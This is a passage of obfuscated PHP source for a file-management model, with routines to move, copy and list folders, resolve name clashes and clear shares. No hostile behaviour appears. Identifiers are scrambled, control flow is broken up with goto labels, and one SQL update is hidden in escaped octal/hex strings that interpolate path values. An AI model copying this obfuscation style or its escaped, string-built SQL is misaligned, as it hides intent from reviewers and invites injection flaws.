$this->saveAll($cˆˆÇ«é¿); return $BèŸ¡Ì…Œ¶; goto E‹ˆÚâÁİ»; FîÀïƒƒ‡: $côŞäŒË¼ = $this->_makeItemData($AĞ±­Á‚¤Ö, $f®«å×Æ·™, $BŒ¼¦†±‚î); Hook::trigger($AñïæåÙ¹[525], $côŞäŒË¼); Hook::trigger($AñïæåÙ¹[526], array($AñïæåÙ¹[527], $côŞäŒË¼, 0)); goto c²õ½ë˜à; BÃº¼Ë•: $AñïæåÙ¹ =& $_SERVER[òÀöí]; $AĞ±­Á‚¤Ö = $this->sourceInfoCache($EÛªø ×åŠ); $f®«å×Æ·™ = $this->sourceInfoCache($e–äÔš»Ü§); goto FîÀïƒƒ‡; e…²©ÑÃÓÎ: $dòÁ–ñ…”Å = $this->sourceInfo($BèŸ¡Ì…Œ¶); foreach ($D‘°ÛÊ†º§ as $Eáä”Ë¯ô¯) { $dªÏ¬–¨À = $this->_makeItemData($Eáä”Ë¯ô¯, $dòÁ–ñ…”Å, $Eáä”Ë¯ô¯[$AñïæåÙ¹[28]]); $dªÏ¬–¨À[$AñïæåÙ¹[477]] = $Eáä”Ë¯ô¯[$AñïæåÙ¹[477]]; $B¸œğÄ¶†[] = $dªÏ¬–¨À; } $this->chunkEventSet($AñïæåÙ¹[528], array($AñïæåÙ¹[529], $côŞäŒË¼, $EÜºåŸ£åà)); goto dã³òœøİÄ; dã³òœøİÄ: $this->addAll($B¸œğÄ¶†, array(), !1); $BùŞµÌ‡“¾ = $this->where(array($AñïæåÙ¹[479] => $BèŸ¡Ì…Œ¶))->select(); $e°…ä…Ì…š = $this->_childrenMakeRelation($D‘°ÛÊ†º§, $BùŞµÌ‡“¾); goto aà¥…Šìø‰; E‹ˆÚâÁİ»: } private function _childrenMakeRelation($Bã‡á¦†É, $e§•ñô©ƒ) { $B…Œóªä‹· =& $_SERVER[òÀöí]; $A‘õ¥ó¤î = array(); $f‚ÌÎ«Ê¬‰ = array(); foreach ($Bã‡á¦†É as $C‰îßöÈé) { $C¬‚ÀÖå¾ƒ = $C‰îßöÈé[$B…Œóªä‹·[28]] . $B…Œóªä‹·[8] . $C‰îßöÈé[$B…Œóªä‹·[477]]; $A‘õ¥ó¤î[$C¬‚ÀÖå¾ƒ] = $C‰îßöÈé[$B…Œóªä‹·[387]]; } foreach ($e§•ñô©ƒ as $C‰îßöÈé) { $C¬‚ÀÖå¾ƒ = $C‰îßöÈé[$B…Œóªä‹·[28]] . $B…Œóªä‹·[8] . $C‰îßöÈé[$B…Œóªä‹·[477]]; $eÎ¨Ë×ÙÁ– = $A‘õ¥ó¤î[$C¬‚ÀÖå¾ƒ]; $f‚ÌÎ«Ê¬‰[$eÎ¨Ë×ÙÁ–] = $C‰îßöÈé[$B…Œóªä‹·[387]]; } return $f‚ÌÎ«Ê¬‰; } private function _childrenMatch($e™”øÖÙãÁ, $cÈğ›¡ßä…, $A©Áğ‚çùš) { goto b§¥áò†…; b§¥áò†…: $FãÜ‘›È£ =& $_SERVER[òÀöí]; $dàô÷ğÓÓÁ = $A©Áğ‚çùš[$FãÜ‘›È£[477]]; $A†˜³¿£À» = $this->parentLevelArray($cÈğ›¡ßä…[$FãÜ‘›È£[477]]); goto EªŠÓãĞÀ; EªŠÓãĞÀ: foreach ($A†˜³¿£À» as $DĞô“¯ÍÅ) { if (isset($e™”øÖÙãÁ[$DĞô“¯ÍÅ])) { $dàô÷ğÓÓÁ .= $e™”øÖÙãÁ[$DĞô“¯ÍÅ] . $FãÜ‘›È£[534]; } } $dàô÷ğÓÓÁ = rtrim($dàô÷ğÓÓÁ, $FãÜ‘›È£[47]) . $FãÜ‘›È£[47]; $DÒ•¦‹¶ó¦ = $this->parentLevelArray($dàô÷ğÓÓÁ); goto AÄ·Íñùà¡; AÄ·Íñùà¡: $D½İÈ¶¸‡ = $DÒ•¦‹¶ó¦[count($DÒ•¦‹¶ó¦) - 1]; return array($FãÜ‘›È£[479] => $D½İÈ¶¸‡, $FãÜ‘›È£[477] => $dàô÷ğÓÓÁ); goto f¯Š•½¹—´; f¯Š•½¹—´: } private function _makeItemData($EàŠéĞŞœÜ, $bì“…±¨©À, $cÁÇæñ¸Î) { $cÊæ¸“‰ò =& $_SERVER[òÀöí]; $E±Á¥„–™‰ = array($cÊæ¸“‰ò[535] => $EàŠéĞŞœÜ[$cÊæ¸“‰ò[388]], $cÊæ¸“‰ò[404] => $cÁÇæñ¸Î, $cÊæ¸“‰ò[536] => $EàŠéĞŞœÜ[$cÊæ¸“‰ò[390]], $cÊæ¸“‰ò[437] => $EàŠéĞŞœÜ[$cÊæ¸“‰ò[436]], $cÊæ¸“‰ò[537] => $EàŠéĞŞœÜ[$cÊæ¸“‰ò[77]], $cÊæ¸“‰ò[538] => $bì“…±¨©À[$cÊæ¸“‰ò[389]], $cÊæ¸“‰ò[539] => $bì“…±¨©À[$cÊæ¸“‰ò[474]], $cÊæ¸“‰ò[540] => USER_ID, $cÊæ¸“‰ò[541] => USER_ID, $cÊæ¸“‰ò[386] => $bì“…±¨©À[$cÊæ¸“‰ò[387]], $cÊæ¸“‰ò[542] => $bì“…±¨©À[$cÊæ¸“‰ò[477]] . $bì“…±¨©À[$cÊæ¸“‰ò[387]] . $cÊæ¸“‰ò[47], $cÊæ¸“‰ò[413] => 0, $cÊæ¸“‰ò[543] => $cÊæ¸“‰ò[33]); return $E±Á¥„–™‰; } private function _copyApplyMeta($aÓãïëÃŠ¯, &$Bˆ»âìô•£) { $f†à…²¢¼© =& $_SERVER[òÀöí]; $CĞçËœ¬ØË = $aÓãïëÃŠ¯[$f†à…²¢¼©[387]]; $EŸ¹½ñÕõ = $aÓãïëÃŠ¯[$f†à…²¢¼©[28]]; if (!isset($aÓãïëÃŠ¯[$f†à…²¢¼©[544]]) || !$aÓãïëÃŠ¯[$f†à…²¢¼©[544]] || $aÓãïëÃŠ¯[$f†à…²¢¼©[544]] == $f†à…²¢¼©[486]) { $Bˆ»âìô•£[$f†à…²¢¼©[520]][] = array($f†à…²¢¼©[387], $CĞçËœ¬ØË, $f†à…²¢¼©[544], short_id($CĞçËœ¬ØË)); } if (Input::check($EŸ¹½ñÕõ, $f†à…²¢¼©[545])) { $Bˆ»âìô•£[$f†à…²¢¼©[519]][] = array($f†à…²¢¼©[387] => $CĞçËœ¬ØË, $f†à…²¢¼©[92] => $f†à…²¢¼©[433], $f†à…²¢¼©[368] => str_replace($f†à…²¢¼©[50], $f†à…²¢¼©[33], Pinyin::encode($EŸ¹½ñÕõ))); $Bˆ»âìô•£[$f†à…²¢¼©[519]][] = array($f†à…²¢¼©[387] => $CĞçËœ¬ØË, $f†à…²¢¼©[92] => $f†à…²¢¼©[432], $f†à…²¢¼©[368] => Pinyin::encode($EŸ¹½ñÕõ, $f†à…²¢¼©[546])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($A¯•˜í×½Å) { goto BáÇ Ï‡ÌÄ; BáÇ Ï‡ÌÄ: $dÛ‡âù‘× =& $_SERVER[òÀöí]; $fÔ‰ïôØ¼¡ = $this->sourceInfo($A¯•˜í×½Å); $DùàÅ©¡ = $dÛ‡âù‘×[415]; goto CßÃ¤ïÇùù; CÎù—Ò¨…ß: $cí˜Ÿ­­…Ş = array_to_keyvalue($cí˜Ÿ­­…Ş, $dÛ‡âù‘×[387]); foreach ($cí˜Ÿ­­…Ş as $dõè¦çÌŸ) { $F²äğ’¦’ = $dõè¦çÌŸ[$dÛ‡âù‘×[479]]; $A¯•˜í×½Å = $dõè¦çÌŸ[$dÛ‡âù‘×[387]]; if (!isset($this->_childrenListCache[$A¯•˜í×½Å]) && $dõè¦çÌŸ[$dÛ‡âù‘×[388]] == $dÛ‡âù‘×[86]) { $this->_childrenListCache[$A¯•˜í×½Å] = array(); } if (!isset($this->_childrenListCache[$F²äğ’¦’])) { $this->_childrenListCache[$F²äğ’¦’] = array(); } $this->_childrenListCache[$F²äğ’¦’][$A¯•˜í×½Å] = $dõè¦çÌŸ; $this->_childrenItemCache[$A¯•˜í×½Å] = $dõè¦çÌŸ; } goto e¬ïËå£ïÙ; CßÃ¤ïÇùù: $EŒ›½–ôš = array($dÛ‡âù‘×[477] => array($dÛ‡âù‘×[501], $fÔ‰ïôØ¼¡[$dÛ‡âù‘×[477]] . $A¯•˜í×½Å . $dÛ‡âù‘×[502]), $dÛ‡âù‘×[414] => $this->targetIsDelete); $cí˜Ÿ­­…Ş = $this->field($DùàÅ©¡)->where($EŒ›½–ôš)->select(); if (!$cí˜Ÿ­­…Ş) { return; } goto CÎù—Ò¨…ß; e¬ïËå£ïÙ: } private function _childrenListAll($b˜Ò‡¦½ºµ, &$Cø‘¸×Š”×) { $BÉñ†éÌá« =& $_SERVER[òÀöí]; if (!isset($this->_childrenListCache[$b˜Ò‡¦½ºµ])) { return; } $FÀÌá®˜È = $this->_childrenListCache[$b˜Ò‡¦½ºµ]; foreach ($FÀÌá®˜È as $dÀ¼ğÍå¼â => $CÀâˆ—ë¯ê) { $Cø‘¸×Š”×[$dÀ¼ğÍå¼â] = $CÀâˆ—ë¯ê; if ($CÀâˆ—ë¯ê[$BÉñ†éÌá«[388]] == $BÉñ†éÌá«[86]) { $this->_childrenListAll($dÀ¼ğÍå¼â, $Cø‘¸×Š”×); } } } private function sourceInfoCache($F“ƒ“œšŞ) { if (isset($this->_childrenItemCache[$F“ƒ“œšŞ])) { return $this->_childrenItemCache[$F“ƒ“œšŞ]; } return $this->sourceInfo($F“ƒ“œšŞ); } private function _childrenList($fˆ†Ç˜”ä¿) { if (isset($this->_childrenListCache[$fˆ†Ç˜”ä¿])) { return $this->_childrenListCache[$fˆ†Ç˜”ä¿]; } return $this->_childrenListSelect($fˆ†Ç˜”ä¿); } private function _childrenListSelect($c¸£¢¿ù­œ) { goto Eè¬¿‘¼Æƒ; Eè¬¿‘¼Æƒ: $B‡¡…Ô­ª =& $_SERVER[òÀöí]; $d«ºäù½¢ = array($B‡¡…Ô­ª[479] => $c¸£¢¿ù­œ, $B‡¡…Ô­ª[414] => $this->targetIsDelete); $EĞ‚®ßİ¿£ = $this->where($d«ºäù½¢)->select(); goto C­Ç¨†óÄ…; C­Ç¨†óÄ…: $EĞ‚®ßİ¿£ = $EĞ‚®ßİ¿£ ? $EĞ‚®ßİ¿£ : array(); $f¨ˆ¿ó·„¹ = array_to_keyvalue($EĞ‚®ßİ¿£, $B‡¡…Ô­ª[387]); $this->_childrenListCache[$c¸£¢¿ù­œ] = $f¨ˆ¿ó·„¹; goto BÃ¶ÒãŒšµ; BÃ¶ÒãŒšµ: foreach ($f¨ˆ¿ó·„¹ as $c¸£¢¿ù­œ => $EŒÅåÜâ˜¯) { $this->_childrenItemCache[$c¸£¢¿ù­œ] = $EŒÅåÜâ˜¯; } return $f¨ˆ¿ó·„¹; goto CŞ­âõÎá’; CŞ­âõÎá’: } private function fileNameExistCache($EÛõ™ĞÊ¶“, $E±»Ş¡Ï¦ñ) { $eè„¾«äÉ =& $_SERVER[òÀöí]; $E±»Ş¡Ï¦ñ = strtolower($E±»Ş¡Ï¦ñ); $E—Şó¾…¤˜ = $this->_childrenList($EÛõ™ĞÊ¶“); foreach ($E—Şó¾…¤˜ as $CÖ“ø‡Š¤×) { if ($E±»Ş¡Ï¦ñ == strtolower($CÖ“ø‡Š¤×[$eè„¾«äÉ[28]])) { return $CÖ“ø‡Š¤×[$eè„¾«äÉ[387]]; } } return !1; } private function fileNameAutoCache($fšò’Ó†ßå, $aó‡ÊÕ¼¬¼, $Eí ÀñÀ¢±, $Bƒ†¬ÍËÀ) { $B¯íØŸ =& $_SERVER[òÀöí]; $D©í‘¯ß = $this->_childrenList($fšò’Ó†ßå); $a†Ò—©ÍàÙ = array_to_keyvalue($D©í‘¯ß, $B¯íØŸ[33], $B¯íØŸ[28]); return $this->fileNameAutoGet($a†Ò—©ÍàÙ, $aó‡ÊÕ¼¬¼, $Eí ÀñÀ¢±, $Bƒ†¬ÍËÀ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($FÕ—´ï¶‚¬, $b»ê¤áŠ§™, $DÂòˆ¶è¥ = REPEAT_REPLACE, $c È“Íá = '') { goto dç÷†Ü¹¦; bÛ×®é¨¡ä: $this->updateModifyTime($d‡œó¥º­µ); Model($CÕ±Ğ±ÖŠÁ[522])->eventMove($FÕ—´ï¶‚¬, $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[479]], $b»ê¤áŠ§™); Hook::trigger($CÕ±Ğ±ÖŠÁ[548], $A«ìÑ—¡¾Œ); goto EäàªÁè±É; Dß‚‘‰°™è: $dİêñ°ÌèØ = $this->fileNameExistCache($b»ê¤áŠ§™, $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[28]]); $f·÷Ê­«‡ = $this->_move($FÕ—´ï¶‚¬, $b»ê¤áŠ§™, $DÂòˆ¶è¥, $bÔØ˜¡—, $c È“Íá); $this->sourceCacheClear(); goto fæÇø¤•âÏ; fæÇø¤•âÏ: if ($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[388]] == $CÕ±Ğ±ÖŠÁ[86] && $dİêñ°ÌèØ) { $this->folderSizeResetChildren($f·÷Ê­«‡); } Model($CÕ±Ğ±ÖŠÁ[173])->linkAdd($bÔØ˜¡—[$CÕ±Ğ±ÖŠÁ[518]]); if ($dİêñ°ÌèØ && $bÔØ˜¡—[$CÕ±Ğ±ÖŠÁ[549]]) { $this->removeNow($FÕ—´ï¶‚¬, !1); } goto e‹é¤‡Ş±; EäàªÁè±É: return $f·÷Ê­«‡; goto dÚ«¤÷´ß; bÃ¦ƒš: $this->folderSizeReset($b»ê¤áŠ§™); $d‡œó¥º­µ = array($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[479]], $b»ê¤áŠ§™); if ($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[388]] == $CÕ±Ğ±ÖŠÁ[86]) { $d‡œó¥º­µ[] = $FÕ—´ï¶‚¬; } goto bÛ×®é¨¡ä; fŒç¾Ü•˜: if ($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[479]] == $b»ê¤áŠ§™ && $c È“Íá != $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[28]]) { $c®å¡¹ †¢ = $this->fileNameExist($b»ê¤áŠ§™, $c È“Íá); if ($c®å¡¹ †¢ && $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[388]] == $CÕ±Ğ±ÖŠÁ[486]) { goto aÏÂ÷ôÙº; a¸ø†ÇÑ™: $this->removeNow($FÕ—´ï¶‚¬, !1); $this->folderSizeReset($b»ê¤áŠ§™); Hook::trigger($CÕ±Ğ±ÖŠÁ[548], $A«ìÑ—¡¾Œ); goto fĞ×¤ÈŞ…ê; fĞ×¤ÈŞ…ê: return $c®å¡¹ †¢; goto FÖÃ‡Ÿ²˜; aÏÂ÷ôÙº: $BçåœÎçç„ = $this->sourceInfo($c®å¡¹ †¢); $BÈÅ•Ğœö = $this->fileHistory($BçåœÎçç„, $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[436]], $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[77]]); if (!$BÈÅ•Ğœö) { Model($CÕ±Ğ±ÖŠÁ[439])->remove($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[436]]); } goto a¸ø†ÇÑ™; FÖÃ‡Ÿ²˜: } } $BğÊïÒĞ‡Í = $c È“Íá ? $c È“Íá : $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[28]]; $this->lockMoveStart($FÕ—´ï¶‚¬); goto F•¿ñğóÏá; dç÷†Ü¹¦: $CÕ±Ğ±ÖŠÁ =& $_SERVER[òÀöí]; $CÒß‘ôÃ³© = $this->sourceInfo($FÕ—´ï¶‚¬); $cÏŞ™®ö…ç = $this->sourceInfo($b»ê¤áŠ§™); goto d¶•Œ´°Ï™; e‹é¤‡Ş±: $this->lockMoveEnd($FÕ—´ï¶‚¬); $this->lockWriteEnd($b»ê¤áŠ§™, $BğÊïÒĞ‡Í); $this->folderSizeReset($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[479]]); goto bÃ¦ƒš; F•¿ñğóÏá: $this->lockWriteStart($b»ê¤áŠ§™, $BğÊïÒĞ‡Í); $bÔØ˜¡— = array($CÕ±Ğ±ÖŠÁ[518] => array(), $CÕ±Ğ±ÖŠÁ[549] => !1); $this->clearShare($FÕ—´ï¶‚¬, $b»ê¤áŠ§™); goto Dß‚‘‰°™è; Eó²¦¦ô¹…: if (!$CÒß‘ôÃ³© || !$cÏŞ™®ö…ç || $cÏŞ™®ö…ç[$CÕ±Ğ±ÖŠÁ[388]] != $CÕ±Ğ±ÖŠÁ[86]) { return !1; } Hook::trigger($CÕ±Ğ±ÖŠÁ[547], $A«ìÑ—¡¾Œ); $this->targetIsDelete = intval($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[414]]); goto fŒç¾Ü•˜; d¶•Œ´°Ï™: if ($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[479]] == $cÏŞ™®ö…ç[$CÕ±Ğ±ÖŠÁ[387]]) { if ($CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[414]] == $CÕ±Ğ±ÖŠÁ[86]) { Model($CÕ±Ğ±ÖŠÁ[412])->restore(array($FÕ—´ï¶‚¬)); } if (!$c È“Íá || $c È“Íá == $CÒß‘ôÃ³©[$CÕ±Ğ±ÖŠÁ[28]]) { return $FÕ—´ï¶‚¬; } } $A«ìÑ—¡¾Œ = $this->pathInfoMore($FÕ—´ï¶‚¬); if ($this->isParentOf($FÕ—´ï¶‚¬, $b»ê¤áŠ§™)) { return !1; } goto Eó²¦¦ô¹…; dÚ«¤÷´ß: } private function _move($c»—”®´‘¦, $cß¦Ñ´…¦°, $cŞË„‡«ÕŸ, &$bïÕ«×ÅŸ, $E¾”¿È·ŸÏ = '') { goto E–”Şİ°©¾; BŸ¬Œ£Èç: $this->lockWriteStart($cß¦Ñ´…¦°, $D‰Œäï†ê); if (!$Fô‹âÒç…Ğ) { return $this->_moveForce($c»—”®´‘¦, $cß¦Ñ´…¦°, $D‰Œäï†ê); } $EÑ£¥ˆ = $Fô‹âÒç…Ğ; goto AÓ©ß³İĞê; AÓ©ß³İĞê: $cÕßÅ·ğŒß = !1; if ($c™Ş’Ü•à¤) { if ($cŞË„‡«ÕŸ == REPEAT_RENAME_FOLDER) { $D‰Œäï†ê = $this->fileNameAuto($cß¦Ñ´…¦°, $D‰Œäï†ê, $cŞË„‡«ÕŸ, $c™Ş’Ü•à¤); $EÑ£¥ˆ = $this->_moveForce($c»—”®´‘¦, $cß¦Ñ´…¦°, $D‰Œäï†ê); } else { if ($cŞË„‡«ÕŸ == REPEAT_RENAME_FOLDER) { $cŞË„‡«ÕŸ = REPEAT_RENAME; } $eãÄ¨ÓÂéÖ = $this->_childrenListSelect($c»—”®´‘¦); foreach ($eãÄ¨ÓÂéÖ as $céŠ‘ÎºíŞ) { $this->_move($céŠ‘ÎºíŞ[$bã¶—–ß©Í[387]], $Fô‹âÒç…Ğ, $cŞË„‡«ÕŸ, $bïÕ«×ÅŸ); } $cÕßÅ·ğŒß = !0; } } else { if ($cŞË„‡«ÕŸ == REPEAT_SKIP) { $cÕßÅ·ğŒß = !0; } else { if ($cŞË„‡«ÕŸ == REPEAT_RENAME || $cŞË„‡«ÕŸ == REPEAT_RENAME_FOLDER) { $D‰Œäï†ê = $this->fileNameAuto($cß¦Ñ´…¦°, $D‰Œäï†ê, $cŞË„‡«ÕŸ, $c™Ş’Ü•à¤); $EÑ£¥ˆ = $this->_moveForce($c»—”®´‘¦, $cß¦Ñ´…¦°, $D‰Œäï†ê); } else { if ($cŞË„‡«ÕŸ == REPEAT_REPLACE) { $b¥‡ÀÉ©Ï = $this->sourceInfoCache($Fô‹âÒç…Ğ); $AŒÏß·¾İæ = $this->fileHistory($b¥‡ÀÉ©Ï, $bï¾à£¦‰ˆ[$bã¶—–ß©Í[436]], $bï¾à£¦‰ˆ[$bã¶—–ß©Í[77]]); if ($AŒÏß·¾İæ) { $bïÕ«×ÅŸ[$bã¶—–ß©Í[518]][] = $bï¾à£¦‰ˆ[$bã¶—–ß©Í[436]]; } else { $cÕßÅ·ğŒß = !0; } } } } } if ($cÕßÅ·ğŒß && !$bïÕ«×ÅŸ[$bã¶—–ß©Í[549]]) { $bïÕ«×ÅŸ[$bã¶—–ß©Í[549]] = !0; } goto bÆßÌˆ’Ñ¯; bÆßÌˆ’Ñ¯: return $EÑ£¥ˆ; goto FÇ˜ëå…ƒ¹; dÈ›°·»: $D‰Œäï†ê = $E¾”¿È·ŸÏ ? $E¾”¿È·ŸÏ : $bï¾à£¦‰ˆ[$bã¶—–ß©Í[28]]; $Fô‹âÒç…Ğ = $this->fileNameExistCache($cß¦Ñ´…¦°, $D‰Œäï†ê); $this->lockMoveStart($c»—”®´‘¦); goto BŸ¬Œ£Èç; E–”Şİ°©¾: $bã¶—–ß©Í =& $_SERVER[òÀöí]; $bï¾à£¦‰ˆ = $this->sourceInfo($c»—”®´‘¦); $c™Ş’Ü•à¤ = $bï¾à£¦‰ˆ[$bã¶—–ß©Í[388]] == $bã¶—–ß©Í[86]; goto dÈ›°·»; FÇ˜ëå…ƒ¹: } private function _moveForce($bÈªšô‡–, $CÙœ‹‚Ï»ê, $aè°¾±Œãì) { goto FŸµÆÜ¾™‡; FŸµÆÜ¾™‡: $dÛœ‚£ÆÆ =& $_SERVER[òÀöí]; $F¨ª„µ›™õ = $this->sourceInfo($bÈªšô‡–); $eÀÌ·£éóÏ = $this->sourceInfo($CÙœ‹‚Ï»ê); goto fÒ™µ¿Ã—â; fÒ™µ¿Ã—â: $f’ÔƒãË»™ = $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[388]] == $dÛœ‚£ÆÆ[86]; $BëÑØÊ—ì = array($dÛœ‚£ÆÆ[386] => $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[387]], $dÛœ‚£ÆÆ[542] => $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[477]] . $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[387]] . $dÛœ‚£ÆÆ[47], $dÛœ‚£ÆÆ[538] => $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[389]], $dÛœ‚£ÆÆ[539] => $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[474]], $dÛœ‚£ÆÆ[541] => USER_ID, $dÛœ‚£ÆÆ[404] => $aè°¾±Œãì); $EøÂòÎ†‘ = $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[389]] == SourceModel::TYPE_GROUP && $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[389]] == SourceModel::TYPE_GROUP && $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[474]] == $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[474]]; goto eš©Ô¨¶‡»; eš©Ô¨¶‡»: if (!$EøÂòÎ†‘) { Model($dÛœ‚£ÆÆ[472])->authClear($bÈªšô‡–); } $A§˜çÎÕ˜ë = $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[414]] == $dÛœ‚£ÆÆ[86] && $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[414]] != $dÛœ‚£ÆÆ[86]; if ($A§˜çÎÕ˜ë) { $BëÑØÊ—ì[$dÛœ‚£ÆÆ[413]] = 0; } goto DÄ¤‡å–î‰; DÄ¤‡å–î‰: if ($f’ÔƒãË»™) { $c¨ÛšĞºÖù = array($dÛœ‚£ÆÆ[542] => array($dÛœ‚£ÆÆ[501], $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[477]] . $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[387]] . $dÛœ‚£ÆÆ[502])); $f °¾ãÃ = $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[477]] . $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[387]] . $dÛœ‚£ÆÆ[47]; $cÀ®ã•Í˜Ä = $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[477]] . $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[387]] . $dÛœ‚£ÆÆ[47] . $F¨ª„µ›™õ[$dÛœ‚£ÆÆ[387]] . $dÛœ‚£ÆÆ[47]; $DİÚ‘Ìì¨ = array($dÛœ‚£ÆÆ[542] => array($dÛœ‚£ÆÆ[550], "\162\145\x70\154\141\x63\145\50\160\x61\x72\x65\156\164\114\145\x76\x65\x6c\x2c\x27{$f °¾ãÃ}\47\x2c\47{$cÀ®ã•Í˜Ä}\x27\51"), $dÛœ‚£ÆÆ[538] => $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[389]], $dÛœ‚£ÆÆ[539] => $eÀÌ·£éóÏ[$dÛœ‚£ÆÆ[474]]); if ($A§˜çÎÕ˜ë) { $DİÚ‘Ìì¨[$dÛœ‚£ÆÆ[413]] = 0; } $this->where($c¨ÛšĞºÖù)->data($DİÚ‘Ìì¨)->save(); } $this->where(array($dÛœ‚£ÆÆ[401] => $bÈªšô‡–))->data($BëÑØÊ—ì)->save(); return $bÈªšô‡–; goto a†´Æ»ºÂ; a†´Æ»ºÂ: } private function clearShare($eÊÄ‚Ì³¹„, $aç”œğÏ½Í) { goto c¹‘¸¢Îã; c¹‘¸¢Îã: $B‘·Áíóáˆ =& $_SERVER[òÀöí]; $bèÀ±½ˆ¡Å = $this->sourceInfo($eÊÄ‚Ì³¹„); $aÔÛ™ÄØ•¶ = $this->sourceInfo($aç”œğÏ½Í); goto b¼„îÙæ…«; a”¬›Îô: if (!$aŠİ¼‹Á) { return; } $F¤³ƒôµšØ = array($B‘·Áíóáˆ[387] => array($B‘·Áíóáˆ[7], $aŠİ¼‹Á), $B‘·Áíóáˆ[464] => 1); $a­È¥ÍŒÆ = Model($B‘·Áíóáˆ[552])->field($B‘·Áíóáˆ[457])->where($F¤³ƒôµšØ)->select(); goto AÈ¤¤Ÿ†ï; AÈ¤¤Ÿ†ï: if (!$a­È¥ÍŒÆ) { return; } $a­È¥ÍŒÆ = array_to_keyvalue($a­È¥ÍŒÆ, $B‘·Áíóáˆ[33], $B‘·Áíóáˆ[457]); $F¤³ƒôµšØ = array($B‘·Áíóáˆ[457] => array($B‘·Áíóáˆ[7], $a­È¥ÍŒÆ)); goto BÉ°ë¹§Óƒ; b¼„îÙæ…«: if ($bèÀ±½ˆ¡Å[$B‘·Áíóáˆ[474]] == $aÔÛ™ÄØ•¶[$B‘·Áíóáˆ[474]] && $bèÀ±½ˆ¡Å[$B‘·Áíóáˆ[389]] == $B‘·Áíóáˆ[551]) { return; } $F¤³ƒôµšØ = array($B‘·Áíóáˆ[477] => array($B‘·Áíóáˆ[501], $bèÀ±½ˆ¡Å[$B‘·Áíóáˆ[477]] . $eÊÄ‚Ì³¹„ . $B‘·Áíóáˆ[502])); $aŠİ¼‹Á = $this->field($B‘·Áíóáˆ[401])->where($F¤³ƒôµšØ)->getField($B‘·Áíóáˆ[387], !0); goto a”¬›Îô; BÉ°ë¹§Óƒ: Model($B‘·Áíóáˆ[552])->where($F¤³ƒôµšØ)->save(array($B‘·Áíóáˆ[464] => 0)); Model($B‘·Áíóáˆ[553])->where($F¤³ƒôµšØ)->delete(); goto fæôœòê; fæôœòê: } public function copyFolderFromIO($aÂÜÆ¿¬®Æ, $bÕ¹Ã‡ŒÑ, $Bğ¡Íµ„Œ, $a¶•ó„êğÙ, $B¿‹‰‚Ïİâ, $a„ÌÃğá× = false) { goto Eİç™¨Ú‰È; BÊæ¤Çºù: $this->updateModifyTime($Bğ¡Íµ„Œ); return $AãÚÒéõ–à; goto E¼³›ĞÒä; EĞÓ‚™‚Õæ: if ($E®È©çƒÊ) { $this->_childrenAllMake($E®È©çƒÊ); } Hook::trigger($bÓÑå„ÍÜ™[555]); $this->_copyChildTo($aÂÜÆ¿¬®Æ, $bÕ¹Ã‡ŒÑ, $AãÚÒéõ–à, $a¶•ó„êğÙ, $e¸ßê¥·ö¬, $B¿‹‰‚Ïİâ); goto D”ïïÁÖù¯; Eİç™¨Ú‰È: $bÓÑå„ÍÜ™ =& $_SERVER[òÀöí]; $e¸ßê¥·ö¬ = array($bÓÑå„ÍÜ™[519] => array(), $bÓÑå„ÍÜ™[520] => array(), $bÓÑå„ÍÜ™[518] => array(), $bÓÑå„ÍÜ™[554] => array()); $b©ì©š‡ß = $a„ÌÃğá× ? $a„ÌÃğá× : $aÂÜÆ¿¬®Æ->pathThis($bÕ¹Ã‡ŒÑ); goto A¡ò‡³õÃ¥; eÄöªÎå˜: Model($bÓÑå„ÍÜ™[439])->linkAdd($e¸ßê¥·ö¬[$bÓÑå„ÍÜ™[518]]); Model($bÓÑå„ÍÜ™[439])->remove($e¸ßê¥·ö¬[$bÓÑå„ÍÜ™[554]]); $this->folderSizeReset($Bğ¡Íµ„Œ); goto BÊæ¤Çºù; f‡Ã¦±ßœ: Model($bÓÑå„ÍÜ™[521])->addAll($e¸ßê¥·ö¬[$bÓÑå„ÍÜ™[519]], array(), !0); Model($bÓÑå„ÍÜ™[522])->eventCopy($AãÚÒéõ–à); $this->saveAll($e¸ßê¥·ö¬[$bÓÑå„ÍÜ™[520]]); goto eÄöªÎå˜; A¡ò‡³õÃ¥: $E®È©çƒÊ = $this->fileNameExist($Bğ¡Íµ„Œ, $b©ì©š‡ß); $AãÚÒéõ–à = $this->mkdir($Bğ¡Íµ„Œ, $b©ì©š‡ß, $a¶•ó„êğÙ); if (!$E®È©çƒÊ || $a¶•ó„êğÙ == 